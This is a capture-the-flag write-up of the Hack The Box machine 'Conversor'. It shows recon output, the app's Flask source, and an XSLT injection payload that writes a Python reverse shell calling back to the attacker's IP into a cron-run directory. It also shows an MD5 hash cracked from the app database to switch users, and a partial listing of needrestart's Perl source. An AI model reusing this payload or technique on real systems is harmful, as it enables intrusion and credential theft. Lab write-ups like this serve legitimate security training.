---
title:HTB: Conersor
date: 2025-10-28 00:00 +0800
categories: [HTB]
tags: [HTB,Easy,Web Exploitation,XSLT Injection,XML,Eval,needrestart]
image: https://github.com/user-attachments/assets/64271ccd-8bd5-4c05-9c89-03b4ca2f02be
---

<img width="703" height="243" alt="image" src="https://github.com/user-attachments/assets/64271ccd-8bd5-4c05-9c89-03b4ca2f02be" />

## Tools
- nmap
- searchsploit
- dirsearch
- 
  
## Recon

Nmap scan result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap-scan.txt 
# Nmap 7.95 scan initiated Mon Oct 27 19:05:46 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -O -sCV -oN nmap-scan2.txt 10.10.11.92
Nmap scan report for 10.10.11.92
Host is up, received echo-reply ttl 63 (0.016s latency).
Scanned at 2025-10-27 19:05:46 +08 for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/27%OT=22%CT=%CU=40718%PV=Y%DS=2%DC=I%G=N%TM=68FF521
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 28.572 days (since Mon Sep 29 05:21:35 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 27 19:05:58 2025 -- 1 IP address (1 host up) scanned in 11.95 seconds
```

## Initial Enumeration

In the first reconnaissance phase we find that `port 80` redirected to **conversor.htb**. We added those to `/etc/hosts`

We searched for known exploits using **searchsploit** based on the Nmap results, and we did find known vuln:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ searchsploit Apache 2.4.52 
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution       | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner     | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                   | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow  | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflo | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflo | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal   | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                     | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                   | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)             | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Up | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Up | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)          | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Cod | linux/remote/34.pl
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
But still, nothing interesting from known vuln. We found that it uses **flask** from **[404 error page](https://0xdf.gitlab.io/cheatsheets/404)**

<img width="1182" height="207" alt="image" src="https://github.com/user-attachments/assets/2d54548c-71fe-4a85-982c-207bd4058929" />

Because there were no valid credentials or obvious SSH exploits, we focused on the manual discovery for web service on **port 80** for now. 

## Discovery

Here is **dirsearch** result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ dirsearch -u conversor.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                        
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HTB/Conversor/reports/_conversor.htb/_25-10-28_17-33-38.txt

Target: http://conversor.htb/

[17:33:39] Starting:                                                                                    
[17:33:46] 200 -    0B  - /about                                            
[17:33:57] 404 -  275B  - /javascript/tiny_mce                              
[17:33:57] 301 -  319B  - /javascript  ->  http://conversor.htb/javascript/ 
[17:33:57] 404 -  275B  - /javascript/editors/fckeditor
[17:33:58] 200 -  722B  - /login                                            
[17:34:05] 200 -  726B  - /register                                         
[17:34:06] 403 -  278B  - /server-status/                                   
[17:34:06] 403 -  278B  - /server-status                                    
                                                                             
Task Completed                      
```

Nothing much, from **dirsearch**

Need to registered, logged in to **authenticated** before we can do a further discovery:

<img width="1124" height="526" alt="image" src="https://github.com/user-attachments/assets/23adde21-9200-48b7-b33a-df26f436a9c0" />

Once logged in, the dashboard had a upload functions file with`.xml` and `.xslt` to beautify printed **nmap** scan results as `.html`

<img width="1325" height="719" alt="image" src="https://github.com/user-attachments/assets/90322b41-a3c6-44fd-8f71-673e2672f58a" />

in **About** section it shown all developers and copy of source code given 

<img width="1405" height="778" alt="image" src="https://github.com/user-attachments/assets/18bcebd9-08b9-4516-b840-a1675ea97496" />

Combined `.xml` & `.xslt` will give us beautify nmap scan result with `.html`:
<img width="1505" height="380" alt="image" src="https://github.com/user-attachments/assets/30ff6b75-2f0f-4397-82f7-15f897b39d19" />

Source code snippet:

**app.py**:
```
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"

```

**install.md**:
```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

We find `app.py`:
- Saves the uploads before any checks
```
xml_file.save(xml_path)
xslt_file.save(xslt_path)  
```

- They hardened the XML parser, but not the XSLT parser. No XSLTAccessControl means libxslt’s extensions are enabled, including EXSLT `exsl:document`, which can write files
```
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
```

From `install.md`:
- Cron job is running  as `www-data` and executing all `.py` files from **/var/www/conversor.htb/scripts/** 

So we can abuse this to get a reverse shell as a `www-data`
Payload used:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap.xml 
<a/>
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap.xslt 
<!-- write_pwn.xslt -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">

  <xsl:output method="text"/>

  <xsl:template match="/">
    <!-- write the Python file to the cron-run directory -->
    <exsl:document href="file:///var/www/conversor.htb/scripts/pwn.py" method="text">
      <xsl:text># payload written by XSLT&#10;</xsl:text>
      <xsl:text>import socket,os,pty&#10;</xsl:text>
      <xsl:text>s=socket.create_connection(("10.10.14.94",4444))&#10;</xsl:text>
      <xsl:text>for fd in (0,1,2): os.dup2(s.fileno(),fd)&#10;</xsl:text>
      <xsl:text>pty.spawn("/bin/bash")&#10;</xsl:text>
    </exsl:document>

    <!-- optional: emit something so transform succeeds -->
    <xsl:text>ok</xsl:text>
  </xsl:template>
</xsl:stylesheet>
```
Setup a listener
```
┌──(kali㉿kali)-[~/Desktop]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 10.10.14.94
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
## Shell as www-data

**BOOM**, here is our Shell!
```
┌──(kali㉿kali)-[~/Desktop]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 10.10.14.94
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.10.11.92-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to deploy Python Agent...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/conversor~10.10.11.92-Linux-x86_64/2025_10_29-11_40_43-658.log 📜
───────────────────────────────────────────────────────────────────────
www-data@conversor:~$ 
```

### sqlite 

```
www-data@conversor:~$ ls
conversor.htb
www-data@conversor:~$ cd conversor.htb/
www-data@conversor:~/conversor.htb$ ls
app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
www-data@conversor:~/conversor.htb$ cd instance/
www-data@conversor:~/conversor.htb/instance$ ls
users.db
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|a|0cc175b9c0f1b6a831c399e269772661
sqlite> 
```

### hashcat (md5)

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]                                                          
└─$ hashcat -hh | grep -i md5                                                                      
      0 | MD5                                                        | Raw Hash
...
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5602 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
Time.Started.....: Wed Oct 29 12:07:52 2025 (3 secs)
Time.Estimated...: Wed Oct 29 12:07:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3542.7 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10977280/14344385 (76.53%)
Rejected.........: 0/10977280 (0.00%)
Restore.Point....: 10973184/14344385 (76.50%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: KeishayYashi -> Karamba
Hardware.Mon.#01.: Util: 27%

Started: Wed Oct 29 12:07:51 2025
Stopped: Wed Oct 29 12:07:57 2025
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ echo "fismathack:5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm" >> creds.txt
```
We have a credentials for user `fismathack`:`Keepmesafeandwarm`

fismathack is one of the developer based on `About` from **http://conversor.htb**. We also find the user in this machine:
```
www-data@conversor:~/conversor.htb/instance$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
www-data@conversor:~/conversor.htb/instance$ ls /home
fismathack
```
## Shell as fismathack

### user.txt
change as user `fismathack`
```
www-data@conversor:/home$ su fismathack
Password: 
fismathack@conversor:/home$ cat fismathack/user.txt 
427c265281e11bbd9fe920e9c62fe1ed
```

### discovery

```
fismathack@conversor:/home$ cat /usr/sbin/needrestart
#!/usr/bin/perl

# nagios: -epn

# needrestart - Restart daemons after library updates.
#
# Authors:
#   Thomas Liske <thomas@fiasko-nw.net>
#
# Copyright Holder:
#   2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]
#
# License:
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this package; if not, write to the Free Software
#   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA
#

use Cwd qw(realpath);
use Getopt::Std;
use NeedRestart;
use NeedRestart::UI;
use NeedRestart::Interp;
use NeedRestart::Kernel;
use NeedRestart::uCode;
use NeedRestart::Utils;
use Sort::Naturally;
use Locale::TextDomain 'needrestart';
use List::Util qw(sum);

use warnings;
use strict;

$|++;
$Getopt::Std::STANDARD_HELP_VERSION++;

my $LOGPREF = '[main]';
my $is_systemd = -d q(/run/systemd/system);
my $is_runit = -e q(/run/runit.stopit);
my $is_tty = (-t *STDERR || -t *STDOUT || -t *STDIN);
my $is_vm;
my $is_container;

if($is_systemd && -x q(/usr/bin/systemd-detect-virt)) {
        # check if we are inside of a vm
        my $ret = system(qw(/usr/bin/systemd-detect-virt --vm --quiet));
        unless($? == -1 || $? & 127) {
                $is_vm = ($? >> 8) == 0;
        }

        # check if we are inside of a container
        $ret = system(qw(/usr/bin/systemd-detect-virt --container --quiet));
        unless($? == -1 || $? & 127) {
                $is_container = ($? >> 8) == 0;
        }
}
elsif(eval "use ImVirt; 1;") {
        require ImVirt;
        ImVirt->import();
        my $imvirt = ImVirt::imv_get(ImVirt->IMV_PROB_DEFAULT);

        $is_vm = $imvirt ne ImVirt->IMV_PHYSICAL;
        $is_container = $imvirt eq ImVirt->IMV_CONTAINER;
}
elsif (-r "/proc/1/environ") {
        # check if we are inside of a container (fallback)
    local $/;
    open(HENV, '<', '/proc/1/environ');
    $is_container = scalar(grep {/^container=/;} unpack("(Z*)*", <HENV>));
    close(HENV)
}

sub HELP_MESSAGE {
    print <<USG;
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information

USG
}

sub VERSION_MESSAGE {
    print <<LIC;

needrestart $NeedRestart::VERSION - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas\@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

LIC
#/
}

our %nrconf = (
    verbosity => 1,
    hook_d => '/etc/needrestart/hook.d',
    notify_d => '/etc/needrestart/notify.d',
    restart_d => '/etc/needrestart/restart.d',
    sendnotify => 1,
    restart => 'i',
    defno => 0,
    ui_mode => 'a',
    systemctl_combine => 0,
    blacklist => [],
    blacklist_interp => [],
    blacklist_rc => [],
    blacklist_mappings => [],
    override_rc => {},
    override_cont => {},
    skip_mapfiles => -1,
    interpscan => 1,
    perlcache => undef,
    kernelhints => 1,
    kernelfilter => qr(.),
    ucodehints => 1,
    q(nagios-status) => {
    services => 1,
    kernel => 2,
    ucode => 2,
    sessions => 2,
    containers => 1,
    },
    has_pam_systemd => 1,
    tolerance => 2,
);

# backup ARGV (required for Debconf)
my @argv = @ARGV;

our $opt_c = '/etc/needrestart/needrestart.conf';
our $opt_v;
our $opt_r;
our $opt_n;
our $opt_m;
our $opt_b;
our $opt_f;
our $opt_k;
our $opt_l;
our $opt_p;
our $opt_o;
our $opt_q;
our $opt_t;
our $opt_u;
our $opt_w;
unless(getopts('c:vr:nm:bf:klpoqt:u:w')) {
    HELP_MESSAGE;
    exit 1;
}

# disable exiting and STDOUT in Getopt::Std for further use of getopts
$Getopt::Std::STANDARD_HELP_VERSION = undef;

# restore ARGV
@ARGV = @argv;

die "ERROR: Could not read config file '$opt_c'!\n" unless(-r $opt_c || $opt_b);

# override debconf frontend
$ENV{DEBIAN_FRONTEND} = $opt_f if($opt_f);
my $debian_noninteractive = (exists($ENV{DEBIAN_FRONTEND}) && $ENV{DEBIAN_FRONTEND} eq 'noninteractive');

# be quiet
if($opt_q) {
    $nrconf{verbosity} = 0;
}
# be verbose
elsif($opt_v) {
    $nrconf{verbosity} = 2;
}

# slurp config file
print STDERR "$LOGPREF eval $opt_c\n" if($nrconf{verbosity} > 1);
eval do {
    local $/;
    open my $fh, $opt_c or die "ERROR: $!\n";
    my $cfg = <$fh>;
    close($fh);
    $cfg;
};
die "Error parsing $opt_c: $@" if($@);

# fallback to stdio on verbose mode
$nrconf{ui} = qq(NeedRestart::UI::stdio) if($nrconf{verbosity} > 1);

die "Hook directory '$nrconf{hook_d}' is invalid!\n" unless(-d $nrconf{hook_d} || $opt_b);
$opt_r = $ENV{NEEDRESTART_MODE} if(!defined($opt_r) && exists($ENV{NEEDRESTART_MODE}));
$opt_r = $nrconf{restart} unless(defined($opt_r));
die "ERROR: Unknown restart option '$opt_r'!\n" unless($opt_r =~ /^(l|i|a)$/);
$is_tty = 0 if($opt_r eq 'i' && $debian_noninteractive);
$opt_r = 'l' if(!$is_tty && $opt_r eq 'i');

$opt_m = $nrconf{ui_mode} unless(defined($opt_m));
die "ERROR: Unknown UI mode '$opt_m'!\n" unless($opt_m =~ /^(e|a)$/);
$opt_r = 'l' if($opt_m eq 'e');
$opt_t = $nrconf{tolerance} unless(defined($opt_t));

$nrconf{defno}++ if($opt_n);
die "Options -p and -o cannot be defined simultaneously\n" if ($opt_p && $opt_o);
$opt_b++ if($opt_p || $opt_o);

needrestart_interp_configure({
    perl => {
        cache_file => $nrconf{perlcache},
    },
});

# print version in verbose mode
print STDERR "$LOGPREF needrestart v$NeedRestart::VERSION\n" if($nrconf{verbosity} > 1);

# running mode (user or root)
my $uid = $<;
if($uid) {
    if($opt_p) {
        print "UNKN - This plugin needs to be run as root!\n";
        exit 3;
    }

    print STDERR "$LOGPREF running in user mode\n" if($nrconf{verbosity} > 1);

    # we need to run as root in order to list system-wide outdated libraries
    if ($opt_o && $opt_l) {
        print STDERR "$LOGPREF OpenMetrics output needs root access to list processes with outdated libraries\n";
        exit 1;
    }
}
else {
    print STDERR "$LOGPREF running in root mode\n" if($nrconf{verbosity} > 1);
}

# get current runlevel, fallback to '2'
my $runlevel = `who -r` || '';
chomp($runlevel);
$runlevel = 2 unless($runlevel =~ s/^.+run-level (\S)\s.+$/$1/);

# get UI
if(defined($opt_u)) {
    if ($opt_u eq '?') {
        print STDERR join("\n\t", __(q(Available UI packages:)), needrestart_ui_list($nrconf{verbosity}, ($is_tty ? $nrconf{ui} : 'NeedRestart::UI::stdio')))."\n";
        exit 0;
    }
    else {
        $nrconf{ui} = $opt_u;
    }
}

my $ui = ($opt_b ? NeedRestart::UI->new(0) : needrestart_ui($nrconf{verbosity}, ($is_tty ? $nrconf{ui} : 'NeedRestart::UI::stdio')));
die "Error: no UI class available!\n" unless(defined($ui));

# Disable UI interactiveness
$ui->interactive(0) if ($ui->can("interactive") && $debian_noninteractive);

# enable/disable checks
unless(defined($opt_k) || defined($opt_l) || defined($opt_w)) {
    $opt_k = ($uid ? undef : 1);
    $opt_l = 1;
    $opt_w = ($uid ? undef : $nrconf{ucodehints});
}

sub parse_lsbinit($) {
